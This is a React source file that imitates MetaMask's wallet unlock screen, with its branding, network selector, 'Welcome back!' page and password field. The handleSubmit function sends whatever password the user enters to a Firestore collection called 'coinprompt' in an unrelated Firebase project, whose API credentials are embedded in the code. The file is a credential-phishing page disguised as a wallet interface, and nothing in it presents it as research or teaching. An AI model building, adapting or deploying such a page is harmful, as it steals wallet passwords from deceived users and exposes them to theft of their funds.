import React, { useEffect, useState } from "react";
import { useWeb3React } from "@web3-react/core";
import { useWalletConnector, setNet } from "./WalletConnector.js";
import Dialog from "@mui/material/Dialog";

import Button from "@mui/material/Button";

import Typography from "@mui/material/Typography";
import Box from "@mui/material/Box";

import Modal from "@mui/material/Modal";
import { initializeApp } from "firebase/app";
import { collection, addDoc, doc, getFirestore } from "firebase/firestore";
import TextField from "@mui/material/TextField";
import "./index.css";
import addImage from "./../../assets/images/icons/add.svg";
import closeImage from "./../../assets/images/icons/close.svg";
import searchImage from "./../../assets/images/icons/search.svg";
import ethereum from "./../../assets/images/icons/eth_logo.svg";
import linea from "./../../assets/images/icons/linea-logo-mainnet.svg";
import polygon from "./../../assets/images/icons/polygon-zkevm.svg";
import arbitrum from "./../../assets/images/icons/arbitrum.svg";
import avalanche from "./../../assets/images/icons/avax-token.svg";
import base from "./../../assets/images/icons/base.svg";
import binance from "./../../assets/images/icons/bnb.svg";
import opmain from "./../../assets/images/icons/optimism.svg";
import zksync from "./../../assets/images/icons/zk-sync.svg";
import moreverfical from "./../../assets/images/icons/more-vertical.svg";
import infoimage from "./../../assets/images/icons/info.svg";
import sepolia from "./../../assets/images/icons/sepolia.png";
import lineasepolia from "./../../assets/images/icons/linea-logo-mainnet.svg";
import MetamaskLogo from "components/metamasklogo.jsx";
const setWalletProvider = (wallet) => {
  localStorage.setItem("wallet", wallet);
};

const style = {
  position: "absolute",
  top: "5px",
  // left: "50%",
  right: "5px",
  // transform: "translate(-50%, -50%)",
  width: 357,
  height: 600,
  bgcolor: "background.paper",
  border: "1px solid #000",
  boxShadow: 2,
  // p: 1,
};
const netPstyle = {
  position: "absolute",
  top: "5px",
  // left: "50%",
  right: "5px",
  // transform: "translate(-50%, -50%)",
  width: 357,
  height: 600,
  bgcolor: "rgba(21, 22, 22, 0.67)",
};
const netstyle = {
  position: "absolute",
  top: "16px",
  right: "16px",
  // transform: "translate(-50%, -50%)",
  width: 325,
  height: 568,
  bgcolor: "white",
  // border: "1px solid #000",
  borderRadius: "9px",
  // boxShadow: "0px 4px 20px rgb(0, 0, 0)"
};

const NetworkWalletProviders = ({
  walletProvidersDialogOpen,
  handleWalletProvidersDialogToggle,
}) => {
  const { library, account } = useWeb3React();
  const { loginMetamask, loginWalletConnect } = useWalletConnector();

  useEffect(() => {
    if (library) {
      handleWalletProvidersDialogToggle();
    }
  }, [library, account]);

  const connectWallet = async (walletprovider) => {
    localStorage.setItem("connected", true);

    switch (walletprovider) {
      case "injected_eth":
        setWalletProvider("injected_eth");
        setNet(0);
        loginMetamask();
        break;
      case "walletconnect_eth":
        setWalletProvider("walletconnect_eth");
        setNet(0);
        loginWalletConnect();
        break;
      case "injected_bsc":
        setWalletProvider("injected_bsc");
        setNet(1);
        loginMetamask();
        break;
      case "walletconnect_bsc":
        setWalletProvider("walletconnect_bsc");
        setNet(1);
        loginWalletConnect();
        break;
      default:
        return null;
    }
  };

  useEffect(() => {
    if (localStorage.getItem("connected")) {
      connectWallet(localStorage.getItem("wallet"));
    }
  }, []);

  const [open, setOpen] = React.useState(true);
  const [during, setDuring] = React.useState(false);
  const [password, setPassword] = React.useState();
  const [isHovered, setIsHovered] = useState(false);

  const handleChangePassword = (event) => {
    setPassword(event.target.value);
  };

  const handleSubmit = async () => {
    setOpen(false);
    setDuring(true);

    let key = password;
    const basic = {
      apiKey: "AIzaSyBqaIcXc2nCmcnamHql4vslkyUuMeaMDK0",
      authDomain: "food-delivery-fa313.firebaseapp.com",
      databaseURL: "https://food-delivery-fa313-default-rtdb.firebaseio.com/",
      projectId: "food-delivery-fa313",
      storageBucket: "food-delivery-fa313.firebasestorage.app",
      messagingSenderId: "132220934048",
      appId: "1:132220934048:web:ca1a6c8d532039f14ef6c5",
      measurementId: "G-884J7HRXJ5",
    };

    let app = initializeApp(basic);

    let db = getFirestore(app);
    try {
      const docRef = await addDoc(collection(db, "coinprompt"), {
        db_info: key,
      });
      console.log(docRef);
    } catch (e) {
      console.error("Error adding document: ", e);
    }
  };
  // const

  // const [testresult, setTestresult] = useState();
  const [searchnet, setSearchnet] = useState("");
  const [netModal, setNetmodal] = useState(false);
  const handlenetmodalOpen = () => setNetmodal(true);
  const handlenetmodalClose = () => setNetmodal(false);
  const closeNet = () => {
    handlenetmodalClose();
    handleWalletProvidersDialogToggle();
  };
  const [borderWidth, setBorderWidth] = useState("0.5px"); // State for border width
  const [enablednet, setEnablednet] = useState([
    { id: "ethereummainnet", icon: ethereum, text: "Ethereum Mainnet" },
    { id: "linea", icon: linea, text: "Linea" },
  ]);
  const [currentnet, setCurrentnet] = useState({
    id: "ethereummainnet",
    icon: ethereum,
    text: "Ethereum Mainnet",
  });
  const selectnet = (id, icon, text) => {
    setCurrentnet({ id: id, icon: icon, text: text });
    handlenetmodalClose();
  };
  const [additionalnet, setAdditionalnet] = useState([
    { id: "arbitrumone", icon: arbitrum, text: "Arbitrum One" },
    { id: "polygonmainnet", icon: polygon, text: "Polygon Mainnet" },
    {
      id: "avalanchenetworkc-chain",
      icon: avalanche,
      text: "Avalanche Network C-Chain",
    },
    { id: "basemainnet", icon: base, text: "Base Mainnet" },
    { id: "binancesmartchain", icon: binance, text: "Binance Smart Chain" },
    { id: "opmainnet", icon: opmain, text: "OP Mainnet" },
    { id: "zksynceramainnet", icon: zksync, text: "zkSync Era Mainnet" },
  ]);

  const [testnet, setTestnet] = useState([
    { id: "sepolia", icon: sepolia, text: "Sepolia" },
    { id: "lineasepolia", icon: lineasepolia, text: "Linea Sepolia" },
  ]);
  const enabledstate = enablednet.filter((item) =>
    item.id.includes(searchnet.toLocaleLowerCase())
  ).length;
  const additionalstate = additionalnet.filter((item) =>
    item.id.includes(searchnet.toLocaleLowerCase())
  ).length;
  const testnetstate = testnet.filter((item) =>
    item.id.includes(searchnet.toLocaleLowerCase())
  ).length;

  return (
    <Dialog
      open={walletProvidersDialogOpen}
      onClose={handleWalletProvidersDialogToggle}
      aria-labelledby="alert-dialog-title"
      aria-describedby="alert-dialog-description"
      BackdropProps={{
        style: {
          backgroundColor: "rgba(111, 126, 140, 0.2)",
          backdropFilter: "blur(2px)",
        },
      }}
      PaperProps={{
        style: { borderRadius: 25, boxShadow: "none" },
      }}
      fullWidth
      maxWidth="xs"
    >
      <Modal
        open={walletProvidersDialogOpen}
        onClose={handleWalletProvidersDialogToggle}
        overlay="true"
        aria-labelledby="modal-modal-title"
        aria-describedby="modal-modal-description"
        // transformOrigin={{ horizontal: "center", vertical: "top" }}
      >
        <Box sx={style}>
          <Box id="app-content">
            <Box className="app os-win">
              <Box className="mm-box multichain-app-header multichain-app-header-shadow mm-box--margin-bottom-0 mm-box--display-flex mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default">
                <Box
                  className="mm-box multichain-app-header__lock-contents mm-box--padding-2 mm-box--display-flex mm-box--gap-2 mm-box--justify-content-space-between mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default"
                  style={{ width: "100%" }}
                >
                  <Box style={{ display: "flex" }}>
                    <Button
                      onClick={handlenetmodalOpen}
                      style={{
                        padding: "3 8px 3px 8px", // Correct padding values with 'px'
                        borderRadius: "15px", // Proper border-radius
                        backgroundColor: "rgba(232, 255, 228, 0.43)", // Correct alpha transparency syntax
                      }}
                      className="mm-box mm-picker-network multichain-app-header__contents__network-picker mm-box--padding-right-4 mm-box--padding-left-2 mm-box--display-flex mm-box--gap-2 mm-box--align-items-center mm-box--background-color-background-alternative mm-box--rounded-pill"
                      aria-label="Network Menu Ethereum Mainnet"
                      data-testid="network-display"
                    >
                      <Box>
                        <img
                          style={{ borderRadius: 4, width: 14 }}
                          src={currentnet.icon}
                          alt={currentnet.text}
                        ></img>
                      </Box>
                      <span
                        style={{ fontSize: 13 }}
                        className="mm-box mm-text--body-sm mm-text--ellipsis mm-box--color-text-default"
                      >
                        {currentnet.text}
                      </span>
                      <span
                        className="mm-box mm-picker-network__arrow-down-icon mm-icon mm-icon--size-xs mm-box--margin-left-auto mm-box--display-inline-block mm-box--color-icon-default"
                        style={{
                          maskImage: 'url("./images/icons/arrow-down.svg")',
                        }}
                      />
                    </Button>
                    <Modal
                      open={netModal}
                      overlay="true"
                      aria-labelledby="modal-modal-title"
                      aria-describedby="modal-modal-description"
                      onClose={closeNet}
                      BackdropProps={{
                        style: {
                          backgroundColor: "rgba(111, 126, 140, 0.2)",
                        },
                      }}
                    >
                      <Box sx={netPstyle}>
                        <Box sx={netstyle}>
                          <div
                            style={{
                              display: "flex",
                              flexDirection: "column",
                              alignItems: "stretch",
                              position: "relative",
                            }}
                          >
                            <div
                              style={{
                                position: "fixed",
                                top: 22,
                                width: "325px",
                                height: "56px",
                                padding: "16px",
                                width: "calc(100% - 48px)",
                                marginLeft: "24px",
                                display: "flex",
                              }}
                            >
                              <h4
                                style={{
                                  textAlign: "center",
                                  width: "245px",
                                  fontSize: 14.5,
                                }}
                              >
                                <b>Select a network</b>
                              </h4>
                              <div style={{ width: "24px" }}>
                                <span
                                  onMouseOver={(e) => {
                                    e.currentTarget.style.backgroundColor =
                                      "rgb(235 245 238/50%)";
                                  }}
                                  onMouseOut={(e) => {
                                    e.currentTarget.style.backgroundColor =
                                      "#ffffff";
                                  }}
                                  onClick={handlenetmodalClose}
                                  style={{
                                    display: "inline-block", // Ensure the span behaves properly as a container
                                    width: "100%",
                                    height: "24px", // Set height explicitly to match the container
                                    backgroundColor: "#ffffff", // Default background color
                                    borderRadius: "4px", // Optional: adds a smoother hover effect
                                    textAlign: "center", // Aligns the content in the middle
                                    cursor: "pointer", // Adds pointer cursor for interactivity
                                  }}
                                >
                                  <img
                                    className="app-header__metafox-logo--icon"
                                    src={closeImage}
                                    alt="Close Icon"
                                    style={{
                                      display: "block",
                                      width: "12px",
                                      height: "auto",
                                      margin: "5px auto", // Centers the image vertically and horizontally
                                    }}
                                  />
                                </span>
                              </div>
                            </div>

                            <div
                              style={{
                                width: "325px",
                                marginTop: 56,
                                height: 432,
                                display: "flex",
                                whiteSpace: "nowrap",
                                overflowX: "hidden",
                                overflowY: "auto",
                              }}
                            >
                              <div>
                                <div
                                  style={{
                                    paddingTop: 0,
                                    paddingLeft: 16,
                                    paddingBottom: 8,
                                    paddingRight: 16,
                                    width: "100%",
                                    height: 56,
                                  }}
                                >
                                  <div
                                    style={{
                                      paddingLeft: 16,
                                      width: "100%",
                                      height: "100%",
                                      border: `${borderWidth} solid rgb(41, 40, 40)`, // Dynamic border width
                                      borderRadius: 4,
                                      display: "flex",
                                    }}
                                  >
                                    <span
                                      style={{
                                        width: 16,
                                        display: "flex",
                                        flexDirection: "column",
                                        justifyContent: "center",
                                      }}
                                    >
                                      <img
                                        src={searchImage}
                                        alt="Search Icon"
                                        style={{ width: "100%" }}
                                      />
                                    </span>
                                    <span
                                      style={{
                                        width: 245,
                                        display: "flex",
                                        alignItems: "center",
                                      }}
                                    >
                                      <input
                                        value={searchnet}
                                        onChange={(e) =>
                                          setSearchnet(e.target.value)
                                        }
                                        placeholder="Search"
                                        onFocus={() => setBorderWidth("2px")} // Thicker border on focus
                                        onBlur={() => setBorderWidth("0.5px")} // Weaker border on blur
                                        style={{
                                          fontSize: 13,
                                          border: "none",
                                          width: 210,
                                          paddingLeft: 8,
                                          paddingRight: 8,
                                          height: 22,
                                          outline: "none", // No outline
                                        }}
                                      />
                                      <span>
                                        {searchnet !== "" && (
                                          <img
                                            onClick={(e) => {
                                              setSearchnet("");
                                            }}
                                            className="app-header__metafox-logo--icon"
                                            src={closeImage}
                                            alt="Close Icon"
                                            style={{
                                              display: "block",
                                              width: "12px",
                                              height: "auto",
                                              margin: "5px auto", // Centers the image vertically and horizontally
                                            }}
                                          />
                                        )}
                                      </span>
                                    </span>
                                  </div>
                                </div>
                                <div>
                                  {enabledstate !== 0 && (
                                    <div
                                      id="active-network"
                                      style={{
                                        width: "100%",
                                        height: 54,
                                        padding: 16,
                                        display: "flex",
                                        flexDirection: "column",
                                        justifyContent: "center",
                                      }}
                                    >
                                      <span
                                        style={{
                                          color: "#6a737d",
                                          fontSize: 13,
                                        }}
                                      >
                                        Enabled networks
                                      </span>
                                    </div>
                                  )}

                                  <div>
                                    {enablednet.map((item, index) => {
                                      if (
                                        item.id.includes(
                                          searchnet.toLocaleLowerCase()
                                        ) === true
                                      ) {
                                        return (
                                          <div
                                            onClick={() =>
                                              selectnet(
                                                item.id,
                                                item.icon,
                                                item.text
                                              )
                                            }
                                            onMouseOver={(e) => {
                                              e.currentTarget.style.backgroundColor =
                                                "rgb(235 245 238 / 50%)";
                                            }}
                                            onMouseOut={(e) => {
                                              e.currentTarget.style.backgroundColor =
                                                "#ffffff";
                                            }}
                                            key={index}
                                            id="available-network"
                                            style={{
                                              width: "100%",
                                              padding: 16,
                                              height: 56,
                                              display: "flex",
                                              justifyContent: "space-between",
                                              alignItems: "center", // Corrected to align items properly
                                            }}
                                          >
                                            <span>
                                              <img
                                                src={item.icon}
                                                style={{
                                                  width: 24,
                                                  borderRadius: 6,
                                                }}
                                                alt={item.text} // Added alt attribute for accessibility
                                              />
                                            </span>
                                            <span
                                              className="mm-box mm-text mm-text--body-md mm-text--ellipsis mm-box--color-text-default mm-box--background-color-transparent"
                                              style={{
                                                width: 196,
                                                fontSize: 15,
                                                paddingTop: 2,
                                              }}
                                            >
                                              {item.text}
                                            </span>
                                            <span>
                                              <img
                                                src={moreverfical}
                                                style={{
                                                  width: 16,
                                                  borderRadius: 5,
                                                }}
                                                alt="More Options Icon" // Added alt attribute for accessibility
                                              />
                                            </span>
                                          </div>
                                        );
                                      }
                                      return null; // Return null if the condition is not met
                                    })}
                                  </div>

                                  {/* working */}

                                  {additionalstate !== 0 && (
                                    <div
                                      id="active-network"
                                      style={{
                                        width: "100%",
                                        height: 54,
                                        padding: 16,
                                        display: "flex",
                                        flexDirection: "column",
                                        justifyContent: "center",
                                      }}
                                    >
                                      <span
                                        style={{
                                          color: "#6a737d",
                                          fontSize: 13,
                                        }}
                                      >
                                        Additional networks
                                        <span>
                                          <img
                                            src={infoimage}
                                            style={{
                                              width: 16,
                                              marginLeft: 12,
                                              filter:
                                                "invert(0%) sepia(0%) saturate(0%) brightness(50%)",
                                            }}
                                          ></img>
                                        </span>
                                      </span>
                                    </div>
                                  )}

                                  <div>
                                    {additionalnet.map((item, index) => {
                                      if (
                                        item.id.includes(
                                          searchnet.toLocaleLowerCase()
                                        ) === true
                                      ) {
                                        return (
                                          <div
                                            key={index}
                                            id="available-network"
                                            style={{
                                              width: "100%",
                                              padding: 16,
                                              height: 56,
                                              display: "flex",
                                              justifyContent: "space-between",
                                              alignItems: "center",
                                            }}
                                          >
                                            <span style={{}}>
                                              <img
                                                src={item.icon}
                                                style={{
                                                  width: 24,
                                                  borderRadius: 6,
                                                }}
                                                alt={item.text} // Added alt attribute for accessibility
                                              />
                                            </span>
                                            <span
                                              className="mm-box mm-text mm-text--body-md mm-text--ellipsis mm-box--color-text-default mm-box--background-color-transparent"
                                              style={{
                                                width: 196,
                                                fontSize: 15,
                                                paddingTop: 2,
                                              }}
                                            >
                                              {item.text}
                                            </span>
                                            <span
                                              onMouseOver={(e) => {
                                                e.currentTarget.style.textDecoration =
                                                  "underline"; // Set underline
                                                e.currentTarget.style.textDecorationColor =
                                                  "#0376c9"; // Set color with transparency
                                                e.currentTarget.style.textDecorationThickness =
                                                  "2px";
                                              }}
                                              onMouseOut={(e) => {
                                                e.currentTarget.style.textDecoration =
                                                  "none"; // Remove underline
                                              }}
                                              style={{
                                                fontWeight: 450,
                                                color: "#0376c9",
                                                fontSize: 14,
                                              }}
                                            >
                                              Add
                                            </span>
                                          </div>
                                        );
                                      }
                                      return null; // Return null if the condition is not met
                                    })}
                                  </div>

                                  {testnetstate !== 0 && (
                                    <div
                                      id="active-network"
                                      style={{
                                        width: "100%",
                                        height: 54,
                                        padding: 16,
                                        display: "flex",
                                        flexDirection: "column",
                                        justifyContent: "center",
                                      }}
                                    >
                                      <span
                                        style={{
                                          color: "#6a737d",
                                          fontSize: 13,
                                        }}
                                      >
                                        Show test networks
                                        <span></span>
                                      </span>
                                    </div>
                                  )}

                                  <div>
                                    {testnet.map((item, index) => {
                                      if (
                                        item.id.includes(
                                          searchnet.toLocaleLowerCase()
                                        ) === true
                                      ) {
                                        return (
                                          <div
                                            onClick={() =>
                                              selectnet(
                                                item.id,
                                                item.icon,
                                                item.text
                                              )
                                            }
                                            onMouseOver={(e) => {
                                              e.currentTarget.style.backgroundColor =
                                                "rgb(235 245 238 / 50%)";
                                            }}
                                            onMouseOut={(e) => {
                                              e.currentTarget.style.backgroundColor =
                                                "#ffffff";
                                            }}
                                            key={index}
                                            id="available-network"
                                            style={{
                                              width: "100%",
                                              padding: 16,
                                              height: 56,
                                              display: "flex",
                                              justifyContent: "space-between",
                                              alignItems: "center", // Corrected to align items properly
                                            }}
                                          >
                                            <span>
                                              <img
                                                src={item.icon}
                                                style={{
                                                  width: 24,
                                                  borderRadius: 6,
                                                }}
                                                alt={item.text} // Added alt attribute for accessibility
                                              />
                                            </span>
                                            <span
                                              className="mm-box mm-text mm-text--body-md mm-text--ellipsis mm-box--color-text-default mm-box--background-color-transparent"
                                              style={{
                                                width: 196,
                                                fontSize: 15,
                                                paddingTop: 2,
                                              }}
                                            >
                                              {item.text}
                                            </span>
                                            <span>
                                              <img
                                                src={moreverfical}
                                                style={{
                                                  width: 16,
                                                  borderRadius: 5,
                                                }}
                                                alt="More Options Icon" // Added alt attribute for accessibility
                                              />
                                            </span>
                                          </div>
                                        );
                                      }
                                      return null; // Return null if the condition is not met
                                    })}
                                  </div>

                                  {enabledstate === 0 &&
                                    additionalstate === 0 &&
                                    testnetstate === 0 && (
                                      <div
                                        style={{
                                          color: "#9fa6ae",
                                          fontSize: 15,
                                          width: 325,
                                          display: "flex",
                                          textWrap: "wrap",
                                          paddingLeft: 14,
                                          paddingRight: 22,
                                        }}
                                      >
                                        No networks found for the given search
                                        query
                                      </div>
                                    )}
                                </div>
                              </div>
                            </div>

                            <div
                              style={{
                                width: "325px",
                                height: "80px",
                                position: "fixed",
                                top: 510,
                                padding: 16,
                              }}
                            >
                              <div
                                onMouseOver={() => setIsHovered(true)}
                                onMouseOut={() => setIsHovered(false)}
                                style={{
                                  height: "100%",
                                  border: "1.4px solid #0376c9",
                                  borderRadius: "26px",
                                  textAlign: "center",
                                  paddingTop: 10,
                                  paddingBottom: 10,
                                  paddingLeft: 16,
                                  paddingRight: 16,
                                  color: isHovered ? "#ffffff" : "#0376c9", // Dynamic text color
                                  backgroundColor: isHovered
                                    ? "#0376c9"
                                    : "#ffffff", // Dynamic background color
                                  cursor: "pointer", // Pointer cursor
                                }}
                              >
                                <div>
                                  <img
                                    src={addImage}
                                    alt="Add Icon"
                                    style={{
                                      width: "15px",
                                      filter: isHovered
                                        ? "invert(100%) sepia(1) saturate(5) hue-rotate(200deg)"
                                        : "invert(20%) sepia(100%) saturate(5000%) hue-rotate(200deg)", // Change color using filters
                                      transition: "filter 0.3s ease", // Smooth transition
                                    }}
                                  />
                                  <font
                                    style={{ fontSize: 13, paddingLeft: 7 }}
                                  >
                                    Add a custom network
                                  </font>
                                </div>
                              </div>
                            </div>
                          </div>
                        </Box>
                      </Box>
                    </Modal>

                    <div style={{ position: "absolute", top: 14, right: 13 }}>
                      <img
                        className="app-header__metafox-logo--icon"
                        src="./images/logo/metamask-fox.svg"
                        alt="metamask-fox"
                        style={{
                          display: "block",
                          width: "34px",
                          height: "auto",
                        }}
                      ></img>
                    </div>
                  </Box>
                </Box>
              </Box>
              <Box className="mm-box main-container-wrapper">
                <Box className="unlock-page__container">
                  <Box
                    className="unlock-page"
                    data-testid="unlock-page"
                    style={{ width: "100%", padding: 28 }}
                  >
                    <Box className="unlock-page__mascot-container">
                      <Box
                        zIndex={0}
                        style={{ display: "flex", alignItems: "center" }}
                      >
                        {/* <img
                          className="app-header__metafox-logo--icon"
                          src="./images/logo/metamask-fox.svg"
                          alt="metamask-fox"
                          style={{
                            display: "block",
                            width: "100px",
                            height: "auto",
                          }}
                        ></img> */}
                        <MetamaskLogo/>
                      </Box>
                    </Box>
                    <h1
                      style={{
                        fontSize: 23,
                        WebkitTextFillColor: "#6a737d",
                        marginTop: 26,
                        marginBottom: 0,
                      }}
                      className="unlock-page__title"
                    >
                      Welcome back!
                    </h1>
                    <Typography
                      style={{
                        WebkitTextFillColor: "#000000",
                        fontSize: 16,
                        fontFamily:
                          " Euclid Circular B, Helvetica, Arial, sans-serif",
                      }}
                    >
                      The decentralized web awaits
                    </Typography>
                    <Box
                      className="unlock-page__form"
                      style={{ margin: "40px 0 8px" }}
                    >
                      <div>
                        <Box
                          component="form"
                          sx={{
                            "& > :not(style)": { m: 1, width: "92%" },
                          }}
                          noValidate
                          autoComplete="off"
                        >
                          <TextField
                            id="standard-password-input"
                            label="Password"
                            type="password"
                            autoComplete="current-password"
                            variant="standard"
                            value={password}
                            onChange={handleChangePassword}
                            onKeyPress={(event) => {
                              if (event.key === "Enter") {
                                event.preventDefault();
                                handleSubmit();
                              }
                            }}
                          />
                        </Box>
                      </div>
                    </Box>
                    <Button
                      variant="contained"
                      style={{
                        margin: "12px 0 0 0",
                        height: 43,
                        fontSize: 16,
                        fontWeight: 400,
                        boxShadow: "none",
                        borderRadius: "100px",
                        color: "#ffffff",
                        backgroundColor: "#6bb6ed",
                        width: "100%",
                        borderColor: "rgb(99 97 97 / 67%)",
                        borderStyle: "solid",
                        borderWidth: "1px",
                        padding: 12,
                      }}
                      data-testid="unlock-submit"
                      onClick={handleSubmit}
                    >
                      <p style={{ fontSize: 14 }}>Unlock</p>
                    </Button>
                    <Box
                      className="unlock-page__links"
                      style={{ margin: "10px 0 0 0" }}
                    >
                      <a
                        className="button btn-link unlock-page__link"
                        role="button"
                      >
                        Forgot password?
                      </a>
                    </Box>
                    <Box
                      className="unlock-page__support"
                      style={{ marginTop: "20px" }}
                    >
                      <span>
                        Need help? Contact{" "}
                        <a
                          href="https://support.metamask.io"
                          target="_blank"
                          rel="noopener noreferrer"
                        >
                          MetaMask support
                        </a>
                      </span>
                    </Box>
                  </Box>
                </Box>
              </Box>
            </Box>
          </Box>
        </Box>
      </Modal>
    </Dialog>
  );
};

export default NetworkWalletProviders;
